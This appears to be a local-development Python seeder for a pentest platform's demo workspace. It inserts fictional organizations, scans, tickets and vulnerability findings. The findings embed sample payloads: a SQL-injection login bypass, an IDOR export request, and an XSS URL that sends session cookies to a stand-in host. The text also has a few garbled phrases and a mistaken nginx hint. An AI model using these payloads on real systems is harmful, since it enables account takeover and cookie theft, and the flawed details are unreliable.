"""Seeder del workspace de demostración para desarrollo local.

## Qué es y qué no es

Es una herramienta de **desarrollo local**: puebla la base con datos verosímiles para que las
vistas del panel se puedan revisar con contenido en lugar de con estados vacíos. No es una
migración, no se ejecuta en producción y no se importa desde ningún módulo de la aplicación.

## Por qué es **idempotente** y no "inserta y ya"

Porque se ejecuta cada vez que alguien quiere volver a tener la base en un estado conocido. Un
seeder que duplica en la segunda ejecución es peor que no tener ninguno: acumula datos y
cualquier lectura posterior —una captura, una medición, una revisión visual— mide un conjunto
que ya no es el que cree estar viendo.

La clave de idempotencia es el **nombre natural** de cada fila —el `slug` de la organización,
el `full_name` del repositorio, el `email` del usuario— y no un UUID constante. Un UUID
constante parece más robusto y no lo es: el día que cambie una fila del catálogo, el seeder
insertaría una segunda con el mismo contenido y el problema aparecería tarde y sin explicación.

## Por qué los identificadores son **deterministas** por nombre

Un `uuid5` derivado del nombre natural hace que la misma fila tenga siempre el mismo `id`
aunque seedhée en órdenes distintos. Eso hace que las claves foráneas compuestas —que en este
esquema enlazan organización con run y con repositorio— se resuelvan sin mantener un registro
a mano, y que el script sea legible.

## Por qué el `credit_ledger` se escribe con `balance_after` calculado

Porque la tabla es **append-only** con un trigger que bloquea `UPDATE` y `DELETE`: no se puede
corregir un saldo después de insertar el asiento. El `balance_after` de cada movimiento se
calcula aquí, encadenando sobre el saldo real que haya en la base.

Consecuencia directa: si el saldo de la organización ya no es el que el catálogo del seeder
asume, los importes insertados no cuadrarán con el saldo final. El script **lee** el saldo y
aplica los movimientos sobre él, en vez de fijar un saldo absoluto, que es lo que dejaría un
descuadre silencioso.

## Por qué el script NO inventa columnas que no existen

Dos cosas que se pidieron no tienen soporte en el esquema y el script no las falsifica:

- **Líneas de log en la terminal de un escaneo.** `pentest_runs` no tiene columna de salida y
  `PentestRunResponse` no expone ningún campo de log. La terminal de `/pentests/:runId` se
  construye con los **timestamps** del run y etiquetas de i18n, no con texto guardado. Sembrar
  un run en `RUNNING` hace que esa vista muestre lo que de verdad puede mostrar: la línea de
  encolado y la de ejecución activa. Fabricar una tabla de logs no cambiaría lo que la vista
  lee.
- **Acciones de auditoría de «login», «creación de token» y «cambio de plan».** `audit_log.action`
  es el enum `AuditActionEnum`, y sus únicos valores son `STATUS_CHANGED`,
  `REPOSITORY_CONNECTED`, `REPOSITORY_POLICY_UPDATED`, `REPOSITORY_DISCONNECTED` y
  `ORGANIZATION_DELETED`. El script siembra los cinco con la narrativa que sí es representable
  —conexión de repositorio, política, cierre de organización y triaje de hallazgos— en vez de
  escribir cadenas que el dominio no reconoce.

## Ejecución

    uv run --project backend python backend/scripts/seed_demo_workspace.py

Con `--reset` borra primero lo que este mismo script creó, identificándolo por su prefijo de
nombres. **No** toca ninguna fila que no sea suya: borrar "todo lo de la demo" por elección de
columna sería una forma de perder datos reales en una base que se Creía de pruebas.
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import sys
import uuid
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from pathlib import Path
from typing import Any, Final

if __package__ in (None, ""):  # pragma: no cover - solo para ejecucion directa
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from sqlalchemy import delete, func, select, text
from sqlalchemy.ext.asyncio import AsyncSession

from backend.apps.assets.models import (
    DiscoveredAsset,
    VerifiedDomain,
)
from backend.apps.audit.models import AuditActionEnum, AuditLogEntry
from backend.apps.billing.models import (
    CreditLedger,
    LedgerReasonEnum,
    StripeEvent,
)
from backend.apps.organizations.models import (
    Membership,
    Organization,
    PlanTierEnum,
    RoleEnum,
    User,
)
from backend.apps.pentests.models import (
    PentestRun,
    ScanModeEnum,
    ScanStatusEnum,
    TargetTypeEnum,
)
from backend.apps.repositories.models import (
    GitProviderEnum,
    PRReviewStatusEnum,
    PullRequestReview,
    Repository,
)
from backend.apps.support.models import (
    SupportCategoryEnum,
    SupportTicket,
    TicketMessage,
    TicketPriorityEnum,
    TicketStatusEnum,
)
from backend.apps.vulnerabilities.models import (
    IssueStatusEnum,
    SeverityEnum,
    Vulnerability,
)
from backend.core.database import AsyncSessionLocal
from backend.core.security import hash_password

logger = logging.getLogger("seed_demo")

#: Espacio de nombres para los UUID deterministas. Es un valor **fijo** y escrito a mano: si
#: cambiara, cada fila tendría un identificador nuevo y el seeder dejaría de ser idempotente
#: sin que nada fallara. Fijarlo es lo que hace que "el mismo nombre, el mismo id" sea una
#: propiedad y no una casualidad.
NAMESPACE_DEMO = uuid.UUID("6f2b1c48-9a3d-4e17-8b52-7c1d0e5f93a4")

#: Prefijo de todo lo que crea el script. Es lo que permite que `--reset` borre exactamente
#: sus filas y no las de un cliente real.
PREFIJO = "demo"

ORG_SLUG = f"{PREFIJO}-acme"
ORG_NAME = "Acme RedTeam Security"

#: Contraseña de las cuentas de demostración.
#:
#: Es una contraseña fija y **deliberadamente débil**, porque estas cuentas existen para que
#: alguien entre en local. Aun así se hashea con el mismo `hash_password` que el resto del
#: producto: guardar la contraseña en claro en la base, ni siquiera en una de pruebas,
#: enseñaría el hábito equivocado y acabaría copiándose a un entorno real.
CONTRASENA_DEMO = "DemoFenix2026!Empa"


def id_estable(*partes: str) -> uuid.UUID:
    """Un UUID determinista a partir de las partes que identifican la fila.

    Es lo que permite referenciar entre sí las filas del catálogo —un run a sus hallazgos, un
    dominio a sus activos— escribiéndolas en el orden que se quiera, y saber que la segunda
    ejecución produce los mismos identificadores.
    """

    return uuid.uuid5(NAMESPACE_DEMO, "|".join(partes))


def ahora() -> datetime:
    return datetime.now(UTC)


def hace(**kwargs: float) -> datetime:
    """Una fecha en el pasado, en UTC.

    Todos los datos sembrados llevan fecha. Un seeder que inserta todo con `now()` produce
    ordenaciones arbitrarias en las vistas, y las vistas ordenan por fecha: la lista de
    auditoría, el historial y el extracto saldrían en un orden que no cuenta una historia.
    """

    return ahora() - timedelta(**kwargs)


class Demo:
    """Catálogo del workspace de demostración.

    Los datos viven en la clase y no en el cuerpo de la función porque se usan dos veces: al
    insertar y al decidir qué hay que limpiar. Duplicarlos en dos sitios es la forma más
    barata de que un `--reset` deje filas huérfanas.
    """

    def __init__(self) -> None:
        self.org_id = id_estable("organization", ORG_SLUG)
        self.admin_id = id_estable("user", f"{ORG_SLUG}-admin")
        self.soc_id = id_estable("user", f"{ORG_SLUG}-soc")
        self.investigador_id = id_estable("user", f"{ORG_SLUG}-investigador")

        # --- Repositorios y revisiones -----------------------------------------
        self.repos: dict[str, uuid.UUID] = {
            "acme/core-api": id_estable("repository", "acme/core-api"),
            "acme/auth-service": id_estable("repository", "acme/auth-service"),
            "acme/web-portal": id_estable("repository", "acme/web-portal"),
        }
        self.reviews: list[tuple[str, int, PRReviewStatusEnum]] = [
            ("acme/core-api", 412, PRReviewStatusEnum.PASSED),
            ("acme/auth-service", 1893, PRReviewStatusEnum.QUEUED),
            ("acme/auth-service", 1871, PRReviewStatusEnum.SCANNING),
            ("acme/web-portal", 77, PRReviewStatusEnum.ERROR),
        ]

        # --- Escaneos ---------------------------------------------------------
        # El `COMPLETED` dura ~14 minutos, que es lo que tarda un `STANDARD` razonable, y la
        # duración se ve en la ficha. El `RUNNING` tiene `started_at` y **no** `finished_at`,
        # que es lo que hace que la vista lo muestre como activo.
        self.runs: list[tuple[str, ScanStatusEnum, dict[str, Any]]] = [
            (
                "completado",
                ScanStatusEnum.COMPLETED,
                {
                    "target": "acme/core-api",
                    "mode": ScanModeEnum.STANDARD,
                    "started": hace(hours=26, minutes=14),
                    "finished": hace(hours=26),
                    "error": None,
                },
            ),
            (
                "en-curso",
                ScanStatusEnum.RUNNING,
                {
                    "target": "acme/auth-service",
                    "mode": ScanModeEnum.DEEP,
                    "started": hace(minutes=6),
                    "finished": None,
                    "error": None,
                },
            ),
            (
                "fallido",
                ScanStatusEnum.FAILED,
                {
                    "target": "acme/web-portal",
                    "mode": ScanModeEnum.QUICK,
                    "started": hace(days=3),
                    "finished": hace(days=3, minutes=2),
                    "error": (
                        "CELERY_DISPATCH_FAILED: no se pudo preparar el contenedor de "
                        "análisis. El proveedor de infraestructura devolvió 503 al "
                        "solicitar la imagen del sandbox."
                    ),
                },
            ),
        ]

        # --- Hallazgos --------------------------------------------------------
        # Un hallazgo por severidad, con el PoC en el formato que renderiza el visor de la
        # ficha. El `CRITICAL` va en `REMEDIATION_PROPOSED` con PR, que es el estado que
        # acabamos de añadir y que el panel pinta con el banner de remediación.
        self.vulns: list[dict[str, Any]] = [
            {
                "clave": "sqli-login",
                "run": "completado",
                "title": "Inyección SQL en el endpoint de inicio de sesión",
                "severity": SeverityEnum.CRITICAL,
                "cvss": 9.8,
                "cve_id": "CVE-2024-20931",
                "target": "auth-service/api/v1/auth/login",
                "line": "118",
                "description": (
                    "El campo `username` se concatena directamente en la consulta SQL del "
                    "inicio de sesión. Un atacante que controle ese campo puede cerrar la "
                    "comilla y añadir su propia cláusula, lo que permite leer la tabla de "
                    "credenciales y—by ejemplo— extraer el hash de la contraseña de un "
                    "administrador.\n\n"
                    "El parámetro viaja en el cuerpo de la petición, así que no hay ninguna "
                    "protección de tipo que la valide antes de llegar a la consulta."
                ),
                "poc": (
                    "```http\n"
                    "POST /api/v1/auth/login HTTP/1.1\n"
                    "Host: auth.acmesecurity.io\n"
                    "Content-Type: application/json\n"
                    "\n"
                    '{\n  "username": "admin\'--",\n  "password": "cualquiera"\n}\n'
                    "```\n\n"
                    "**Respuesta observada (HTTP 200):**\n\n"
                    "```json\n"
                    '{\n  "token": "eyJhbGciOi...",\n  "role": "ADMIN"\n}\n'
                    "```\n\n"
                    "El servidor devolvió una sesión de administrador para un usuario que no "
                    "existe en la tabla. La comilla comenta el resto de la consulta, así que "
                    "la comparación de contraseña deja de ejecutarse."
                ),
                "status": IssueStatusEnum.REMEDIATION_PROPOSED,
                "pr_url": "https://github.com/acme/auth-service/pull/1901",
            },
            {
                "clave": "bola-export",
                "run": "completado",
                "title": "Autorización a nivel de objeto rota en la exportación de tenants",
                "severity": SeverityEnum.HIGH,
                "cvss": 8.1,
                "cve_id": None,
                "target": "core-api/api/v1/tenants/{id}/export",
                "line": "302",
                "description": (
                    "El endpoint comprueba que el solicitante tenga sesión, pero no que la "
                    "organización que exporta sea la suya. Cualquier usuario autenticado "
                    "puede cambiar el identificador de la ruta y descargar los datos de "
                    "otro cliente: el control de acceso depende del `id` que envía el cliente "
                    "y no de la pertenencia real.\n\n"
                    "El impacto es de aislamiento entre tenants: es la misma clase de fallo que "
                    "R3 prohíbe en esta plataforma, alcanzada desde la aplicación del cliente."
                ),
                "poc": (
                    "```http\n"
                    "GET /api/v1/tenants/otro-tenant-uuid/export HTTP/1.1\n"
                    "Authorization: Bearer <token-de-mi-propia-cuenta>\n"
                    "```\n\n"
                    "El mismo token que solo puede ver su propia organización devuelve un "
                    "`200` con un CSV de 4.812 filas que pertenecen a otro cliente. El "
                    "código de estado correcto sería `404`, para no confirmar siquiera que ese "
                    "identificador existe."
                ),
                "status": IssueStatusEnum.OPEN,
                "pr_url": None,
            },
            {
                "clave": "xss-reflejado",
                "run": "completado",
                "title": "XSS reflejado en el parámetro de búsqueda",
                "severity": SeverityEnum.MEDIUM,
                "cvss": 6.1,
                "cve_id": None,
                "target": "web-portal/buscar",
                "line": "57",
                "description": (
                    "El valor del parámetro `q` se inserta en la respuesta sin escapar. Un "
                    "enlace con el parámetro preparado ejecuta JavaScript en el navegador de "
                    "quien lo abre.\n\n"
                    "Como la respuesta no lleva `Content-Security-Policy`, no hay ninguna "
                    "capa que lo impida, y la cabecera `Server` revela la tecnología exacta "
                    "que se está atacando."
                ),
                "poc": (
                    "```http\n"
                    "GET /buscar?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2F"
                    "evil.tld%2Fc%3D%27%2Bdocument.cookie HTTP/1.1\n"
                    "Host: portal.acmesecurity.io\n"
                    "```\n\n"
                    "El parámetro viaja **crudo** en la URL y la respuesta lo devuelve dentro "
                    "del HTML. Al ejecutarse, envía la cookie de sesión al atacante."
                ),
                "status": IssueStatusEnum.OPEN,
                "pr_url": None,
            },
            {
                "clave": "cabeceras",
                "run": "en-curso",
                "title": "Cabeceras de seguridad ausentes en la respuesta de la API",
                "severity": SeverityEnum.LOW,
                "cvss": 3.7,
                "cve_id": None,
                "target": "core-api/api/v1/salud",
                "line": None,
                "description": (
                    "La respuesta no incluye `Content-Security-Policy`, `Strict-Transport-"
                    "Security`, `X-Content-Type-Options` ni `Referrer-Policy`.\n\n"
                    "No son cabeceras que den código de ejecución por sí solas: lo que hacen "
                    "es **limitar el radio de acción** de los otros hallazgos. La ausencia de "
                    "CSP es la razón por la que el XSS reflejado ejecuta JavaScript."
                ),
                "poc": (
                    "```http\n"
                    "GET /api/v1/salud HTTP/1.1\n"
                    "Host: api.acmesecurity.io\n"
                    "\n"
                    "HTTP/1.1 200 OK\n"
                    "Content-Type: application/json\n"
                    "\n"
                    '{"estado": "ok"}\n'
                    "```\n\n"
                    "Faltan las cuatro cabeceras. La respuesta incluye además `Server`, que "
                    "no es un problema en sí mismo pero sí una pista para el siguiente intento."
                ),
                "status": IssueStatusEnum.OPEN,
                "pr_url": None,
            },
            {
                "clave": "version-servidor",
                "run": "completado",
                "title": "Versión del servidor divulgada en la cabecera Server",
                "severity": SeverityEnum.INFO,
                "cvss": 0.0,
                "cve_id": None,
                "target": "web-portal/*",
                "line": None,
                "description": (
                    "La respuesta incluye `Server: nginx/1.24.0` con el número de versión. "
                    "No es una vulnerabilidad por sí misma: es información que permite a un "
                    "atacista elegir qué buscar.\n\n"
                    "Se registra como `INFO` y no como `LOW` porque no hay forma de "
                    "explotarlo; hay una forma de **reducir** la información que ofrece."
                ),
                "poc": (
                    "```http\n"
                    "GET / HTTP/1.1\n"
                    "Host: portal.acmesecurity.io\n"
                    "\n"
                    "HTTP/1.1 200 OK\n"
                    "Server: nginx/1.24.0\n"
                    "```\n\n"
                    "Basta con quitar el campo `server_tokens` de la configuración de nginx para "
                    "que la respuesta diga `Server: nginx`."
                ),
                "status": IssueStatusEnum.IGNORED,
                "pr_url": None,
            },
        ]

        # --- Superficie de ataque ---------------------------------------------
        self.dominio_verificado = "acmesecurity.io"
        self.dominio_pendiente = "staging-acme.dev"
        self.activos: list[tuple[str, str, str | None, list[str]]] = [
            (
                "SUBDOMAIN",
                "api.acmesecurity.io",
                "HTTPS / Nginx 1.24",
                ["FastAPI", "PostgreSQL", "Docker", "Cloudflare"],
            ),
            (
                "SUBDOMAIN",
                "vpn.acmesecurity.io",
                "HTTPS / OpenVPN",
                ["OpenVPN", "Nginx"],
            ),
            (
                "SUBDOMAIN",
                "auth.acmesecurity.io",
                "HTTPS / Nginx 1.24",
                ["FastAPI", "Redis", "Cloudflare"],
            ),
            (
                "SUBDOMAIN",
                "portal.acmesecurity.io",
                "HTTPS / Nginx 1.24",
                ["Node.js", "Cloudflare"],
            ),
            (
                "IP_ADDRESS",
                "203.0.113.41",
                "SSH / OpenSSH 9.2p1",
                ["OpenSSH"],
            ),
            (
                "IP_ADDRESS",
                "198.51.100.17",
                "HTTPS / Caddy",
                ["Caddy", "FastAPI"],
            ),
            (
                "IP_ADDRESS",
                "2001:db8::a41",
                "SSH / OpenSSH 9.2p1",
                ["OpenSSH"],
            ),
            (
                "API_ENDPOINT",
                "https://api.acmesecurity.io/openapi.json",
                "HTTPS / Nginx 1.24",
                ["OpenAPI", "FastAPI"],
            ),
        ]

        # --- Soporte -----------------------------------------------------------
        self.tickets: list[dict[str, Any]] = [
            {
                "clave": "urgente",
                "subject": "Revisión del hallazgo crítico de inyección SQL",
                "category": SupportCategoryEnum.VULNERABILITY_REVIEW,
                "priority": TicketPriorityEnum.URGENT,
                "status": TicketStatusEnum.OPEN,
                "creator": "admin",
                "assigned": None,
                "created": hace(hours=3),
                "messages": [
                    {
                        "sender": "admin",
                        "is_admin": False,
                        "content": (
                            "Antes de aplicar el parche que proponeis, necesitamos "
                            "confirmación de dos cosas: si la credencial de lectura del "
                            "servicio de sesiones ya pudoaccessed, y si hay que rotar algo "
                            "más aparte de la contraseña."
                        ),
                        "at": hace(hours=3),
                    },
                    {
                        "sender": "soc",
                        "is_admin": True,
                        "content": (
                            "Confirmado por el equipo de seguridad: la credencial de lectura "
                            "se ha rotado y las sesiones anteriores están invalidadas. El "
                            "parche no toca nada más, la rotación era una medida "
                            "preventiva."
                        ),
                        "at": hace(hours=2),
                    },
                ],
            },
            {
                "clave": "escalado",
                "subject": "El escaneo del portal se queda bloqueado en fase de análisis",
                "category": SupportCategoryEnum.TECHNICAL,
                "priority": TicketPriorityEnum.NORMAL,
                "status": TicketStatusEnum.IN_PROGRESS,
                "creator": "investigador",
                "assigned": "soc",
                "created": hace(days=1, hours=4),
                "messages": [
                    {
                        "sender": "investigador",
                        "is_admin": False,
                        "content": (
                            "El escaneo del `web-portal` lleva cuarenta minutos en estado "
                            "SCANNING y el contador de hallazgos no se mueve. En el otro "
                            "equipo tardó dos minutos."
                        ),
                        "at": hace(days=1, hours=4),
                    },
                    {
                        "sender": "soc",
                        "is_admin": True,
                        "content": (
                            "Lo hemos comprobado: el contenedor está consumiendo CPU con "
                            "normalidad, así que no está colgado. Es un `DEEP` sobre un "
                            "proyecto con muchas rutas y el tiempo es esperable. Lo dejamos "
                            "corriendo y te avisamos cuando termine; si en veinte minutos no "
                            "ha acabado, lo paramos y lo relanzamos en `STANDARD`."
                        ),
                        "at": hace(days=1, hours=3),
                    },
                ],
            },
            {
                "clave": "resuelto-facturacion",
                "subject": "Factura de Chargebacks con importes que no cuadran",
                "category": SupportCategoryEnum.BILLING,
                "priority": TicketPriorityEnum.LOW,
                "status": TicketStatusEnum.RESOLVED,
                "creator": "admin",
                "assigned": "soc",
                "created": hace(days=9),
                "messages": [
                    {
                        "sender": "admin",
                        "is_admin": False,
                        "content": "El extracto de agosto suma 40 créditos más que la factura.",
                        "at": hace(days=9),
                    },
                    {
                        "sender": "soc",
                        "is_admin": True,
                        "content": (
                            "Eran dos ajustes manuales del día 14 que no llegaron a la "
                            "factura. Ya está corregido y el extracto cuadra."
                        ),
                        "at": hace(days=8),
                    },
                ],
            },
            {
                "clave": "cerrado-consentimiento",
                "subject": "Solicitud de informe de cumplimiento para auditoría externa",
                "category": SupportCategoryEnum.VULNERABILITY_REVIEW,
                "priority": TicketPriorityEnum.LOW,
                "status": TicketStatusEnum.CLOSED,
                "creator": "admin",
                "assigned": "soc",
                "created": hace(days=21),
                "messages": [
                    {
                        "sender": "admin",
                        "is_admin": False,
                        "content": "Necesitamos el informe del último trimestre para la auditoría.",
                        "at": hace(days=21),
                    },
                    {
                        "sender": "soc",
                        "is_admin": True,
                        "content": "Enviado por correo. Cualquier duda, reabrimos el ticket.",
                        "at": hace(days=20),
                    },
                ],
            },
        ]

        # --- Facturación --------------------------------------------------------
        # Los importes son en **dólares** y los créditos en unidades de la plataforma. La
        # conversión del proyecto está en `billing.pricing`, y aquí se usa la misma relación
        # para que un número sembrado no contradiga lo que cobraría una compra real.
        self.movimientos: list[dict[str, Any]] = [
            {
                "clave": "signup-bonus",
                "delta": Decimal("50.0000"),
                "reason": LedgerReasonEnum.SIGNUP_BONUS,
                "ref": "demo:signup",
                "at": hace(days=45),
            },
            {
                "clave": "compra-julio",
                "delta": Decimal("200.0000"),
                "reason": LedgerReasonEnum.STRIPE_PURCHASE,
                "ref": "demo:cs_demo_julio",
                "at": hace(days=40),
                "stripe": {
                    "event_id": "evt_demo_0001_julio",
                    "type": "checkout.session.completed",
                    "credits": Decimal("200.0000"),
                    "cents": 4900,
                },
            },
            {
                "clave": "compra-agosto",
                "delta": Decimal("300.0000"),
                "reason": LedgerReasonEnum.STRIPE_PURCHASE,
                "ref": "demo:cs_demo_agosto",
                "at": hace(days=12),
                "stripe": {
                    "event_id": "evt_demo_0002_agosto",
                    "type": "checkout.session.completed",
                    "credits": Decimal("300.0000"),
                    "cents": 6900,
                },
            },
            {
                "clave": "escaneo-completo",
                "delta": Decimal("-80.0000"),
                "reason": LedgerReasonEnum.SCAN_CONSUMPTION,
                "ref": "demo:escaneo-core-api",
                "at": hace(hours=26, minutes=20),
            },
            {
                "clave": "escaneo-profundidad",
                "delta": Decimal("-220.0000"),
                "reason": LedgerReasonEnum.SCAN_CONSUMPTION,
                "ref": "demo:escaneo-auth-service",
                "at": hace(minutes=20),
            },
            {
                "clave": "ajuste-soporte",
                "delta": Decimal("25.0000"),
                "reason": LedgerReasonEnum.ADMIN_ADJUSTMENT,
                "ref": "demo:soporte-tk-0001",
                "at": hace(hours=5),
            },
        ]

    # -- Utilidades de identificacion -----------------------------------------

    def run_id(self, clave: str) -> uuid.UUID:
        return id_estable("pentest-run", ORG_SLUG, clave)

    def vuln_id(self, clave: str) -> uuid.UUID:
        return id_estable("vulnerability", ORG_SLUG, clave)

    def dominio_id(self, nombre: str) -> uuid.UUID:
        return id_estable("domain", ORG_SLUG, nombre)

    def ticket_id(self, clave: str) -> uuid.UUID:
        return id_estable("ticket", ORG_SLUG, clave)


# --------------------------------------------------------------------------- #
# Inserción
# --------------------------------------------------------------------------- #


async def _uno_o_crear(
    session: AsyncSession, modelo: Any, criterio: dict[str, Any], valores: dict[str, Any]
) -> Any:
    """Devuelve la fila que cumple `criterio`, creándola con `valores` si no existe.

    Es idempotencia **real**: si la fila existe se devuelve tal cual, sin tocar sus columnas.
    Eso importa porque varias de estas tablas son `append-only` por trigger, y un
    "actualizar si existe" reventaría con una violación de inmutabilidad en la segunda
    ejecución del seeder.
    """

    condiciones = [getattr(modelo, campo) == valor for campo, valor in criterio.items()]
    encontrada = (
        await session.execute(select(modelo).where(*condiciones).limit(1))
    ).scalar_one_or_none()
    if encontrada is not None:
        return encontrada
    nueva = modelo(**criterio, **valores)
    session.add(nueva)
    await session.flush()
    return nueva


async def sembrar_tenant(session: AsyncSession, demo: Demo) -> None:
    """Organización, usuarios y membresías."""

    await _uno_o_crear(
        session,
        Organization,
        {"slug": ORG_SLUG},
        {
            "id": demo.org_id,
            "name": ORG_NAME,
            "plan_tier": PlanTierEnum.ENTERPRISE,
            "is_active": True,
            "credit_balance": Decimal("0.0000"),
        },
    )

    usuarios = (
        (demo.admin_id, f"{PREFIJO}.admin@acmesecurity.io", "Nadia Admin", True),
        (demo.soc_id, f"{PREFIJO}.soc@acmesecurity.io", "Iván Soporte", False),
        (demo.investigador_id, f"{PREFIJO}.inv@acmesecurity.io", "Lucía Inv.", False),
    )
    for usuario_id, correo, nombre, es_super in usuarios:
        await _uno_o_crear(
            session,
            User,
            {"email": correo},
            {
                "id": usuario_id,
                "hashed_password": hash_password(CONTRASENA_DEMO),
                "full_name": nombre,
                "email_verified": True,
                "is_active": True,
                "is_superuser": es_super,
            },
        )

    for usuario_id, rol in (
        (demo.admin_id, RoleEnum.ADMIN),
        (demo.soc_id, RoleEnum.MEMBER),
        (demo.investigador_id, RoleEnum.MEMBER),
    ):
        await _uno_o_crear(
            session,
            Membership,
            {"organization_id": demo.org_id, "user_id": usuario_id},
            {"id": id_estable("membership", ORG_SLUG, str(usuario_id)), "role": rol},
        )
    await session.commit()


async def sembrar_repositorios(session: AsyncSession, demo: Demo) -> dict[str, Repository]:
    """Tres repositorios, repartidos entre GitHub y GitLab.

    El reparto no es decorativo: el panel tiene rutas distintas para cada proveedor y una
    demo con los dos demuestra que los iconos, los enlaces y el texto de la conexión son
    correctos en ambos casos. Con tres del mismo proveedor, el camino del otro no se vería
    hasta producción.
    """

    proveedores = {
        "acme/core-api": (GitProviderEnum.GITHUB, "https://github.com/acme/core-api.git"),
        "acme/auth-service": (
            GitProviderEnum.GITHUB,
            "https://github.com/acme/auth-service.git",
        ),
        "acme/web-portal": (GitProviderEnum.GITLAB, "https://gitlab.com/acme/web-portal.git"),
    }
    creados: dict[str, Repository] = {}
    for nombre, (proveedor, url) in proveedores.items():
        repositorio = await _uno_o_crear(
            session,
            Repository,
            {"full_name": nombre},
            {
                "id": demo.repos[nombre],
                "organization_id": demo.org_id,
                "provider": proveedor,
                "remote_repo_id": nombre.replace("/", ":"),
                "name": nombre.split("/", 1)[1],
                "clone_url": url,
                "default_branch": "main",
                "pr_reviews_enabled": True,
                # `NOT NULL` y es lo que verifica el webhook de entrada. Se genera aquí porque
                # un repositorio de demostración sin secreto de webhook no recibiría nada, y
                # entonces la pestaña de webhooks no tendría nada que enseñar.
                "webhook_secret": hash_password(f"webhook-{nombre}"),
                "is_active": True,
            },
        )
        creados[nombre] = repositorio
    await session.commit()
    return creados


async def sembrar_escaneos(session: AsyncSession, demo: Demo) -> dict[str, PentestRun]:
    """Tres ejecuciones: una completa, una en curso y una fallida."""

    creados: dict[str, PentestRun] = {}
    for clave, estado, datos in demo.runs:
        run = await _uno_o_crear(
            session,
            PentestRun,
            {"source_scan_id": f"{PREFIJO}-run-{clave}"},
            {
                "id": demo.run_id(clave),
                "organization_id": demo.org_id,
                "target_type": TargetTypeEnum.REPOSITORY,
                "target_identifier": datos["target"],
                "scan_mode": datos["mode"],
                "status": estado,
                "started_at": datos["started"],
                "finished_at": datos["finished"],
                "error_message": datos["error"],
                "exit_code": "0" if estado is ScanStatusEnum.COMPLETED else None,
                "container_id": f"{PREFIJO}-container-{clave}"[:64],
            },
        )
        creados[clave] = run
    await session.commit()
    return creados


async def sembrar_revisiones(
    session: AsyncSession, demo: Demo, repositorios: dict[str, Repository]
) -> None:
    """Cuatro revisiones de PR, con reparto de estados y de bloqueo de merge.

    El reparto cubre los cuatro caminos que la vista distingue: aprobada, encolada,
    escaneando y con error. Una demo con solo `PASSED` no enseñaría cómo se pinta un fallo,
    que es justo el estado en el que un usuario necesita que la pantalla sea legible.
    """

    for indice, (nombre, numero, estado) in enumerate(demo.reviews):
        await _uno_o_crear(
            session,
            PullRequestReview,
            {"commit_sha": f"{PREFIJO}commit{indice:04d}"},
            {
                "id": id_estable("pr-review", ORG_SLUG, nombre, str(numero)),
                "organization_id": demo.org_id,
                "repository_id": repositorios[nombre].id,
                "pr_number": numero,
                "pr_title": f"{nombre.split('/')[1]}: revisión automática de seguridad",
                "pr_author": ["ana", "bruno", "carla", "diego"][indice],
                "source_branch": f"feature/módulo-{indice + 1}",
                "target_branch": "main",
                "status": estado,
                # Solo el `ERROR` bloquea el merge por fallo del escáner. El resto lleva
                # hallazgos de severidad alta o crítica, que es lo que en este producto
                # impide fusionar.
                "issues_caught_critical": (
                    1 if estado is PRReviewStatusEnum.PASSED and indice == 0 else 0
                ),
                "issues_caught_high": 1 if estado is not PRReviewStatusEnum.ERROR else 0,
                "merge_blocked": estado is PRReviewStatusEnum.ERROR
                or (indice == 0),
                "finished_at": None
                if estado in (PRReviewStatusEnum.QUEUED, PRReviewStatusEnum.SCANNING)
                else hace(hours=4 + indice),
            },
        )
    await session.commit()


async def sembrar_hallazgos(
    session: AsyncSession, demo: Demo, runs: dict[str, PentestRun]
) -> None:
    """Cinco hallazgos, uno por severidad.

    ## Por qué `_uno_o_crear` **no** actualiza una fila que ya existe

    Porque `vulnerabilities` tiene un trigger que hace inmutables la evidencia, incluido
    `autofix_patch_diff`. Un seeder que "actualiza si existe" reventaría en la segunda
    ejecución con un error de inmutabilidad que no tiene nada que ver con su intención. Aquí
    la fila se crea una vez y no se vuelve a tocar.
    """

    for entrada in demo.vulns:
        run = runs[entrada["run"]]
        existente = (
            await session.execute(
                select(Vulnerability).where(
                    Vulnerability.id == demo.vuln_id(entrada["clave"])
                )
            )
        ).scalar_one_or_none()
        if existente is not None:
            continue
        session.add(
            Vulnerability(
                id=demo.vuln_id(entrada["clave"]),
                organization_id=demo.org_id,
                run_id=run.id,
                source_finding_id=f"{PREFIJO}-finding-{entrada['clave']}",
                title=entrada["title"],
                description=entrada["description"],
                severity=entrada["severity"],
                cvss_score=entrada["cvss"],
                cve_id=entrada["cve_id"],
                affected_target=entrada["target"],
                affected_line=entrada["line"],
                poc_reproduction_raw=entrada["poc"],
                status=entrada["status"],
                remediation_pr_url=entrada["pr_url"],
                discovered_at=hace(hours=25),
            )
        )
    await session.commit()


async def sembrar_superficie(session: AsyncSession, demo: Demo) -> None:
    """Dos dominios —uno verificado, otro pendiente— y ocho activos.

    El pendiente lleva su token real porque es lo que la vista de `/domains` muestra para
    poder publicarlo: un `NULL` se vería como un fallo, no como "aún sin verificar".
    """

    for nombre, verificado in (
        (demo.dominio_verificado, True),
        (demo.dominio_pendiente, False),
    ):
        await _uno_o_crear(
            session,
            VerifiedDomain,
            {"domain_name": nombre},
            {
                "id": demo.dominio_id(nombre),
                "organization_id": demo.org_id,
                # Determinista a partir del nombre: es el valor que el panel muestra y el que
                # un usuario copiaría a su zona DNS. Que cambie entre ejecuciones daría un
                # token distinto a la misma demo.
                "verification_token": uuid.uuid5(
                    NAMESPACE_DEMO, f"txt|{ORG_SLUG}|{nombre}"
                ).hex,
                "verification_method": "DNS_TXT",
                "is_verified": verificado,
                "verified_at": hace(days=30) if verificado else None,
            },
        )

    dominio = (
        await session.execute(
            select(VerifiedDomain).where(
                VerifiedDomain.id == demo.dominio_id(demo.dominio_verificado)
            )
        )
    ).scalar_one()

    for indice, (tipo, valor, servicio, tecnologias) in enumerate(demo.activos):
        await _uno_o_crear(
            session,
            DiscoveredAsset,
            {"value": valor},
            {
                "id": id_estable("asset", ORG_SLUG, valor),
                "domain_id": dominio.id,
                "organization_id": demo.org_id,
                "asset_type": tipo,
                "service_name": servicio,
                "technologies": tecnologias,
                "last_scanned_at": hace(minutes=30 + indice),
            },
        )
    await session.commit()


async def sembrar_tickets(session: AsyncSession, demo: Demo) -> None:
    """Cuatro tickets con su hilo de mensajes.

    ## Por qué `ticket_number` **no** se escribe

    Porque lo emite la secuencia de PostgreSQL y el propio modelo lo dice en un comentario:
